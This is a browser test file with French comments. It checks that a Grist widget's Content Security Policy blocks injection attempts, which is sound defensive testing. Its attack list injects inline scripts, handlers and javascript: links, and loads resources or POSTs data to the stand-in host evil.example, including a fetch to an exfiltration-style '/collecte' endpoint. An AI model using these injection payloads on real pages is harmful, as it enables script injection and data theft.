// La politique de sécurité de contenu de index.html (1.29.1) refuse, dans un vrai navigateur, ce qu'une injection tenterait : un
// script ou un gestionnaire en ligne, un script ou une feuille de style d'un autre site, une requête ou une image en http vers un
// autre site, un cadre, un objet, une police, un média, un travailleur, une balise base, un formulaire. Chaque cas la tente dans
// la vraie page ; le navigateur doit le signaler (événement securitypolicyviolation, recueilli par le harnais) et rien ne doit
// s'exécuter. Le dernier test vérifie que la politique laisse passer ce dont le widget a besoin.
//
// tests/csp.test.mjs lit la balise telle qu'elle est écrite ; tout autre test navigateur échoue si la page enfreint sa politique
// (assertNoCspViolation, dans tests/support/harness.mjs). Rien de tout cela ne dit comment le vrai Grist réagit : TESTING.md,
// section 22.
//
// Optionnel, comme e2e.test.mjs : nécessite Playwright (voir TESTING.md).

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { sampleTables } from './fixtures.mjs';
import { skip, until, waitForCards, withWidget } from './support/browser.mjs';

// `directive` : la directive que le navigateur désigne ; `blocked` : ce qu'il a refusé ; `run` : la tentative, jouée dans la page.
// Un script ou un gestionnaire qui s'exécuterait poserait `window.__ran`.
const ATTACKS = [
  {
    name: 'un script en ligne', directive: 'script-src-elem', blocked: 'inline',
    run: () => {
      const script = document.createElement('script');
      script.textContent = 'window.__ran = "script"';
      document.head.append(script);
    }
  },
  {
    name: 'un gestionnaire d\'événement en ligne', directive: 'script-src-attr', blocked: 'inline',
    run: () => {
      document.body.insertAdjacentHTML('beforeend', '<button id="piege" onclick="window.__ran = \'gestionnaire\'">x</button>');
      document.getElementById('piege').click();
    }
  },
  {
    name: 'une adresse javascript:', directive: 'script-src-elem', blocked: 'inline',
    run: () => {
      const link = document.createElement('a');
      link.href = 'javascript:window.__ran = "lien"';
      document.body.append(link);
      link.click();
    }
  },
  {
    name: 'un script d\'un autre site', directive: 'script-src-elem', blocked: 'https://evil.example/x.js',
    run: () => {
      const script = document.createElement('script');
      script.src = 'https://evil.example/x.js';
      document.head.append(script);
    }
  },
  {
    name: 'une feuille de style d\'un autre site', directive: 'style-src-elem', blocked: 'https://evil.example/x.css',
    run: () => {
      const link = document.createElement('link');
      link.rel = 'stylesheet';
      link.href = 'https://evil.example/x.css';
      document.head.append(link);
    }
  },
  {
    name: 'une image en http d\'un autre site', directive: 'img-src', blocked: 'http://evil.example/p.png',
    run: () => { new Image().src = 'http://evil.example/p.png'; }
  },
  {
    name: 'une requête en http vers un autre site', directive: 'connect-src', blocked: 'http://evil.example/collecte',
    run: () => { fetch('http://evil.example/collecte', { method: 'POST', body: 'x' }).catch(() => {}); }
  },
  {
    name: 'un cadre', directive: 'frame-src', blocked: 'evil.example',
    run: () => {
      const frame = document.createElement('iframe');
      frame.src = 'https://evil.example/';
      document.body.append(frame);
    }
  },
  {
    name: 'un objet', directive: 'object-src', blocked: 'evil.example',
    run: () => {
      const object = document.createElement('object');
      object.data = 'https://evil.example/o.swf';
      document.body.append(object);
    }
  },
  {
    name: 'une police', directive: 'font-src', blocked: 'https://evil.example/f.woff2',
    run: () => {
      const style = document.createElement('style');
      style.textContent = '@font-face { font-family: piege; src: url(https://evil.example/f.woff2) } body { font-family: piege }';
      document.head.append(style);
    }
  },
  {
    name: 'un média', directive: 'media-src', blocked: 'https://evil.example/a.mp3',
    run: () => {
      const audio = document.createElement('audio');
      audio.src = 'https://evil.example/a.mp3';
      document.body.append(audio);
    }
  },
  {
    name: 'un travailleur', directive: 'worker-src', blocked: 'blob',
    run: () => { new Worker(URL.createObjectURL(new Blob(['postMessage(1)']))); }
  },
  {
    name: 'une balise base', directive: 'base-uri', blocked: 'https://evil.example/',
    run: () => {
      const base = document.createElement('base');
      base.href = 'https://evil.example/';
      document.head.append(base);
    }
  },
  {
    name: 'un formulaire', directive: 'form-action', blocked: 'https://evil.example/',
    run: () => {
      const form = document.createElement('form');
      form.method = 'post';
      form.action = 'https://evil.example/';
      document.body.append(form);
      form.requestSubmit();
    }
  }
];

for (const attack of ATTACKS) {
  test(`la politique refuse ${attack.name}, et rien ne s'exécute`, { skip }, () => withWidget({}, async ({ page, logs }) => {
    await waitForCards(page, 4);
    await page.evaluate(attack.run);
    await until(() => logs.cspViolations.length > 0, `le navigateur a signalé le refus de ${attack.name}`);
    assert.ok(logs.cspViolations.every(violation => violation.startsWith(`${attack.directive} : `)), logs.cspViolations.join(' | '));
    assert.ok(logs.cspViolations.some(violation => violation.includes(attack.blocked)), logs.cspViolations.join(' | '));
    assert.equal(await page.evaluate(() => window.__ran), undefined, 'rien ne s\'est exécuté');
    assert.ok(await page.evaluate(() => location.href.startsWith('http://127.0.0.1')), 'la page n\'a pas quitté le widget');
    logs.cspViolations.length = 0; // refus voulu : le harnais ne doit pas l'échouer
  }));
}

test('la politique laisse passer ce dont le widget a besoin : images et requêtes en https, aperçus data: et blob:, boucle locale', { skip }, () =>
  withWidget({}, async ({ page, logs }) => {
    await waitForCards(page, 4);
    // Les sites étrangers sont coupés par le harnais (hermétique) : ces demandes échouent donc, mais sans que la politique
    // les ait refusées. Une image data: ou blob: se charge vraiment.
    const settled = await page.evaluate(async () => {
      const loads = src => new Promise(resolve => {
        const image = new Image();
        image.onload = () => resolve('chargée');
        image.onerror = () => resolve('échec');
        image.src = src;
      });
      const canvas = document.createElement('canvas');
      canvas.width = canvas.height = 2;
      const blob = await new Promise(resolve => canvas.toBlob(resolve));
      const requests = ['https://pieces-jointes.example/api/envoi', 'http://127.0.0.1:59999/envoi', 'http://localhost:59999/envoi']
        .map(url => fetch(url, { method: 'POST', body: 'x' }).then(() => 'reçue', () => 'échec'));
      return {
        data: await loads(canvas.toDataURL()),
        blob: await loads(URL.createObjectURL(blob)),
        https: await loads('https://pieces-jointes.example/logo.png'),
        requests: await Promise.all(requests)
      };
    });
    assert.deepEqual({ data: settled.data, blob: settled.blob }, { data: 'chargée', blob: 'chargée' });
    assert.deepEqual([settled.https, ...settled.requests], ['échec', 'échec', 'échec', 'échec']);
    await page.evaluate(() => 0);
    assert.deepEqual(logs.cspViolations, [], 'la politique n\'a refusé aucune de ces demandes');
  }));

// Grist encadre le widget dans une iframe sandbox. Sans allow-same-origin, l'origine de la page est opaque (« null ») : 'self' doit
// pourtant laisser charger les fichiers du dépôt, sinon la politique viderait le widget dans ce cadre.
test('la politique laisse le widget se charger dans un cadre sandbox sans allow-same-origin (origine opaque)', { skip }, () =>
  withWidget({}, async ({ page, context }) => {
    const origin = new URL(page.url()).origin;
    const outer = await context.newPage();
    await outer.addInitScript(values => Object.assign(window, values),
      { __tables: sampleTables(), __failTables: [], __user: null, __denyWrites: [], __denyRows: {}, __delay: 0 });
    await outer.setContent(`<iframe sandbox="allow-scripts allow-forms allow-popups" src="${origin}/index.html"></iframe>`);
    const frame = await (await outer.waitForSelector('iframe')).contentFrame();
    await waitForCards(frame, 4);
    assert.equal(await frame.evaluate(() => window.origin), 'null', 'le cadre est bien sandboxé : son origine est opaque');
  }));
